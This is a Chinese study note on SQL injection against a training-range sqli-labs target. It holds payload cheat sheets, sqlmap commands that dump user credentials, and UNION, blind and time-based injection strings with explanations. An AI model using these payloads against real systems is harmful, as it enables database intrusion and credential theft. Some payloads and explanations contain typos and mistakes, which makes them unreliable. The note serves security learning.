# SQL注入
## 简介
SQL注入是学习过程中第一个接触的漏洞，也是应用比较广泛的漏洞

本笔记基于厦门大学网络安全实训靶场提供的相关工具和靶场进行学习

在笔记的最后会补充一些关于SQL数据库的基础知识

## 原理
用户输入的数据被SQL解释器执行，通过猜测后台的SQL语句，进行恶意的SQL语句查询

正确的SQL查询语句一般为:

`select * from table where id = 'input'`

`select * from table where id = "input"`

`select * from table where id = ("input")`

`select * from table where id = ('input')`

`select * from table where id = ("'input'"")`

## 注入思路
验证漏洞存在-->使用sqlmap工具或webshell手工注入

## 语句速查表
### 1 常用注入测试payload

`' and 1=1 #`

`' or 1=1 --`

`" and 1=1 --`

`" or 1=1 --`

`') and 1=1 --`

`") and 1=1 --`

`'") and 1=1 --`

### 2 常用查询注入语句(分为SQLmap语句和手工注入)
#### SQLmap语句

`sqlmap.py -u "http://IP/Less-1/?id=1" `

`sqlmap.py -u "http://IP/Less-1/?id=1" --current-db`

`sqlmap.py -u "http://IP/Less-1/?id=1" --tables -D "你刚刚查到的数据库名"`

`sqlmap.py -u "http://IP/Less-1/?id=1"  --columns -T "users" -D "你刚刚查到的数据库名"`

`sqlmap.py -u "http://IP/Less-1/?id=1"  --dump -C"id,username,password" -T "users" -D "security"`


#### 手工注入语句

`id=-1' union select 1,2,3 --+ `

`id=-1' union select 1,group_concat(schema_name),3 from information_schema.shcemata --+ `

`id=-1' union select 1,database(),3 from information_schema.shcemata --+ `

`id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = "security" --+ `

`id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name = "users" --+ `

`id=-1' union select 1,group_concat(id,username,password),3 from users --+ `

## SQL注入学习要点

## get类型

### （一）验证SQL注入漏洞的存在

举个例子:利用单引号尝试回显`http://IP/Less-1/?id=1 ' or 1=1 --+`  (此处ip为靶场提供的内网地址)得到报错回显 `near ''1'' LIMIT 0,1' at line 1`

除此之外 根据速查表1 我们还能用`"` `'"` `')` `")` `'")`进行注入测试

此处要为初学者解释报错回显的内容

1. 还原现场

原始 SQL 模板大概长这样

`SELECT * FROM users WHERE id='1' LIMIT 0,1`

因此输入后拼接得到的SQL语句为

`SELECT * FROM users WHERE id='1'` `' LIMIT 0,1`

                             └─┬─┘   └────┬────┘
                            你的输入    模板残留

引号配对被打乱：`'1'` 是一个完整的字符串，后面剩下的 `' LIMIT 0,1` 又开了一个字符串，但直到语句结束都没有闭合，词法分析器一路读到底，于是报语法错误。

2. 语句拆解

MySQL 的报错格式是：... right syntax to use near '<出错的SQL片段>' at line <行号>

==========================================================================================

`片段`---------------`来源`-------------------------`含义`

`near`---------------`报错格式`--------------------`“错误发生在……附近”，后面跟的是出错处原始 SQL 文本`

`最外层的一对 '…'`---`报错格式的定界符`-----------`是 MySQL 用来包裹片段的引号，不属于 SQL。剥掉后真正的片段是 '1'' LIMIT 0,1`

`第 1 个 '`----------`SQL 模板 id='$id'`---------`你输入内容前面的引号，说明注入点位于单引号字符串内部`

`1`-------------------`你的输入`--------------------`你输入的数字被原样带进了报错——证明输入确实进了 SQL，不是被过滤/丢弃`

`第 2 个 '`----------`你的输入（注入的引号）`-----`闭合了 '1' 这个字符串字面量，是整条链路的“开关”`

`第 3 个 '`----------`SQL 模板结尾的引号`---------`本来负责闭合 '$id'，现在被“挤”成了新字符串的开头，造成未闭合`

`LIMIT 0,1`----------`SQL 模板`-------------------`分页子句：LIMIT offset, count，即跳过 0 条、取 1 条。`

`at line 1`----------`报错格式`---------------------`错误在 SQL 语句的第 1 行（整条语句是一行）。不是“你输入的第 1 行”`

==========================================================================================

有了这部分补充知识，你就能看懂后面的内容了

再构造语句`id=1' and 1=1 --+`和`id=1' and 1=2 --+`逻辑上分别为True和False，页面回显也分别正常和错误，所以存在sql注入漏洞


### （二）开始愉快的注入
#### (1)使用sqlmap工具自动注入(os:使用小飞机发起进攻...)
1. 用Sqlmap查询数据库类型,输入命令：

`sqlmap.py -u "http://IP/Less-1/?id=1" --forms`

2. 用Sqlmap查询所有数据库，输入命令：

`sqlmap.py -u "http://IP/Less-1/?id=1" --forms --current-db`

3. 用Sqlmap查询security库的数据表,输入命令：

`sqlmap.py -u "http://IP/Less-1/?id=1" --tables -D "你刚刚查到的数据库名" --forms`

4. 用Sqlmap查询users表的所有列,输入命令：

`sqlmap.py -u "http://IP/Less-1/?id=1"  --columns -T "users" -D "你刚刚查到的数据库名" --forms`

5. 用Sqlmap获取列的内容,输入命令：

`sqlmap.py -u "http://IP/Less-1/?id=1"  --dump -C"id,username,password" -T "users" -D "security" --forms`

#### (2) 掌握手工注入的办法(os:如果你没有sqlmap工具，你要怎么发起攻击呢...?)
##### 1. 列字段检测

`' order by n`

##### 2. 手工注入
###### 采用`union select`联合注入法

原理: 在url语句中已经使用了`'`或者其他的字段闭合了前一个sql语句，后面接`union select`表示继续执行下一个查询语句

示例(关于这里出现的函数，语法，请看文档最后的补充知识):

1. 验证(注意看id的值):

`id=-1' union select 1,2,3 --+`

2. 查询数据库:

`id=-1' union select 1,group_concat(schema_name),3 from information_schema.schemata --+`

补充: 除了这样查询之外，还可以传入其他你想查询的内容

`id=-1' union select 1,database(),3 from information_schema.shcemata --+ ` 

3. 查询指定数据库中的数据表

`id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = "数据库名字 --+ "` 

4. 查询指定数据表中的字段

`id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name = "表单名" --+ `

5. 查询指定字段中的数据

`id=-1' union select 1,group_concat(id,username,password),3 from 表单名`

这里值得提出强调的是`语句4`和`语句5`,同样是表单名为什么`语句4`要用双引号，而`语句5`不用?

答案在于 在`语句4`中，表单名作为一个字符串被赋给table_name，而在`语句5`中，表单名本身作为sql语句中的变量参与进语句中。

###### 另外一些注入
比较简单的注入
1. 对mysql版本进行尝试

`id=1' and left(version(),1)=1 --+`页面返回正常，mysql的版本用的是1.xxx的

2. 猜测数据库长度

`id=1 ' and  length(database())=8--+`数据库`security`字符长度为8，回显True

3. 猜测数据库第一位字符

`id=1 ' and left(database(),1)>"a" --+ `利用二分法可以快速猜解数据库名(os: 并非快速)

困难预警(os:超级拼装)

4. 猜测数据库中的数据表

举个例子: 如下数据表

mysql> show tables;

+--------------------+

| Tables_in_security |

+--------------------+

| emails             |

| referers           |

| uagents            |

| users              |

+--------------------+

(1) 猜测数据表的第一位字符

`id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>80 --+`

仔细对照知识补充部分的函数解释来解读这段payload(ascII编码为80的字符是`P`)

(2) 猜测数据表的第二位字符

只需改`substr(**,2,1)`

(3) 猜测第二个数据表

只需改`limit 1,1`

(4) 猜测users表中是否存在us**的列

`id=1' and 1=(select 1 from information_schema.columns where table_name='users' and table_name regexp '^us[a-z]'  limit 0,1 )  --+`

(5) 猜测是否存在username列

`id=1' and 1=(select 1 from information_schema.columns where table_name='users'  and column_name regexp '^username'  limit 0,1 )  --+`

(6) 获取users表的内容(此处新函数较多，仔细阅读补充内容13-16)

`id=1' and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))=68--+`

5. 导出文件

`Load_file(file_name)`: 读取文件并返回该文件的内容作为一个字符串。

(1) 使用条件:

`A、必须有权限读取并且文件必须完全可读`

`and (select count(*) from mysql.user)>0/*` 如果结果返回正常,说明具有读写权限。

`and (select count(*) from mysql.user)>0/*` 返回错误，应该是管理员给数据库帐户降权  

`B、欲读取文件必须在服务器上  `

`C、必须指定文件完整的路径  `

`D、欲读取文件必须小于max_allowed_packet`

(2) 注入:

修改mysql配置文件，添加如下代码即可。

`[mysqld]`

`secure-file-priv="C:/phpstudy/WWW/"`

`/* C:/phpstudy/WWW/  为允许写入的文件目录  */`

6. 延时盲注

尝试了诸如`id=1 '` `id=1 ' and 1=1 --+` `id=1 ' and 1=2 --+` `id=1 " and 1=1 --+` `id=1 " and 1=2 --+`页面都没有回显

尝试盲注(此处示例为单引号，除此之外还有双引号，括号)

`?id=1' and if(ascii(substr(database(),1,1))=115,1,sleep(5))--+`

看完补充知识可以理解，如果database()首字母对应s(ascII=115),则响应较快通常表示首字符是 s；延迟则可能表示不是

## post类型
什么是post 呢？就是数据从客户端提交到服务器端，例如我们在登录过程中，输入用户名和密码，用户名和密码以表单的形式提交，提交到服务器后服务器再进行验证。这就是一次post 的过程的。

常见post类型的后台sql语句

`SELECT username, password FROM 用户表 WHERE username='input' and password='input' ;`

`SELECT username, password FROM 用户表 WHERE username='input' and password='input' ;`

`SELECT username, password FROM 用户表 WHERE username="input" and password='input' ;`




## SQL数据库的补充知识
一 基础字符部分

1 注释符号: 常见注释符号为`#` `--`

2 特殊转义符号: 常见转义符号有`+`(在拼接进入sql语句时会自动变成空格)

二 sql语法部分(根据学习过程中遇到的顺序进行排列，方便查找)

1. `order by n`

解释: `order by n`语句用于测试正确的字段数n，只有当n恰好等于字段数的时候，回显才正确

2. 为什么 `id=-1`? 原因在于当id的数据在数据库中不存在时，前台页面返回我们构造的union的数据

3. `group_concat()`

含义: group_concat() 是 MySQL/MariaDB 的`聚合函数`，它把多行数据拼接成一个字符串。在注入中，它的核心价值是：把“一次只能回显一行、一个字段”的输出通道，变成一个能一次获取整张表数据的输出通道。

重要性: 1 解除每次注入只能显示一行的限制。2 使用`group_concat()`可以在括号中拼接多个可查找的目标字段，大大提高效率。3 避免风控，将多次查找降低到一次

4. `information_schema`

含义: 是 MySQL/MariaDB 自带的“元数据库”`（数据字典）`，存放“服务器上有哪些库、哪些表、每张表有哪些列、什么类型、什么权限”这些关于数据的数据。用来摸清结构，提取数据。

结构: `informationm_schema`有三张重要表`schemata` `tables` `columns`分别存储 数据库名，表名，列名

5. `database()`

含义: database()函数会返回当前数据库的名称

6. `left(a,b)`

含义: 从左侧截取 a 的前 b 位

7. `ascii()`

含义: ascii()将某个字符转换为ascii值

8. `substr()`

含义: substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度

9. `limit a,b`

含义: 跳过前a行，取第b行

10. `regexp`

含义: 这是用正则表达式检查字符串是否匹配某种模式

11. `^`

含义: 这是正则表达式的行首锚点，表示匹配内容必须从字符串开头开始

12. `'^us[a-z]'`

含义: `[a-z]` 是正则表达式的字符集合，表示匹配一个小写英文字母

      整句表示字符串必须以 us 开头，后面紧跟一个小写字母，例如 user_id、`usage` 会匹配；`us` 本身或 us_abc 不匹配。

13. `ORD()`

含义: 同`ascii()` 把字符转换成ASCII编码

14. `MID(a,b,c)`

含义: 从b位置开始，截取字符a的c位

15. `IFNULL(expr,replacement)`

含义: 检测expr是否为null，若为null则用replacement替换(示例语句中的0X20为16进制下空格字符)

16. `CAST(expr AS CHAR)`

含义: 把 expr 转成字符类型(CHAR)

17. `ORDER BY id`

含义: 表示按 id 列对查询结果排序，默认升序(从小到大)

18. `IF(条件, 1, SLEEP(5))=115`

含义: 若判断为true，则返回1，不然则暂停五秒

19. `sleep(5)`

含义: 暂停5秒
